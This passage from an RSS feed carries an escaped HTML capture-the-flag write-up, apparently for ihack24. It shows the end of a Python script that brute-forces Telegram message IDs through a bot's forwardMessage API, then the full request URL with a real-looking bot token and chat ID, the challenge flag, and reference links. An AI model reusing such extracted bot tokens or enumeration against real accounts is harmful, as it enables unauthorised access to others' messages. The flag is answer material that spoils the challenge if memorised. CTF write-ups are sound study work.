+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Found &amp;#39;ihack&amp;#39; in message ID &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">message_id&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Failed to forward message ID &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">message_id&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">status_code&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">except&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">exceptions&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">RequestException&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Error: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">message_id&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message_id&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">brute_force_message_id&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Then, &lt;strong>message ID number 173&lt;/strong> was received, and the request now appears as follows:&lt;/p>
+&lt;p>&lt;a class="link" href="https://api.telegram.org/bot6610257712:AAFq_tYFDs5ZpWttF94KchKyzULBVQUW0PY/forwardMessage?from_chat_id=6212716112&amp;amp;message_id=173&amp;amp;chat_id=6212716112" target="_blank" rel="noopener"
+>https://api.telegram.org/bot6610257712:AAFq_tYFDs5ZpWttF94KchKyzULBVQUW0PY/forwardMessage?from_chat_id=6212716112&amp;message_id=173&amp;chat_id=6212716112&lt;/a>&lt;/p>
+&lt;p>The flag will be shown in a json format as below&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/info17.png"
+width="480"
+height="707"
+srcset="https://n3rr.github.io/p/ihack24/info17_hu_d8c10b3915d0e165.png 480w, https://n3rr.github.io/p/ihack24/info17_hu_c55dccb94c270d7b.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="67"
+data-flex-basis="162px"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>Flag:&lt;/strong> ihack24{fr0m_J4V45Cr1p7_2_73L39r4m}&lt;/p>&lt;/blockquote>
+&lt;h1 id="reference">Reference
+&lt;/h1>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>Splunk SPL Commands:&lt;/strong> &lt;a class="link" href="https://www.youtube.com/playlist?list=PLFF93FRoUwXEGaNAmZTc9pek9WzUq6unp" target="_blank" rel="noopener"
+>https://www.youtube.com/playlist?list=PLFF93FRoUwXEGaNAmZTc9pek9WzUq6unp&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>MITRE ATT&amp;amp;CK:&lt;/strong> &lt;a class="link" href="https://attack.mitre.org/" target="_blank" rel="noopener"
+>https://attack.mitre.org/&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Zach&amp;rsquo;s writeup:&lt;/strong> &lt;a class="link" href="https://zachwong02.github.io/post/malware-finds-a-way/" target="_blank" rel="noopener"
+>https://zachwong02.github.io/post/malware-finds-a-way/&lt;/a>&lt;/p>
+&lt;/li>
+&lt;/ul></description></item></channel></rss>
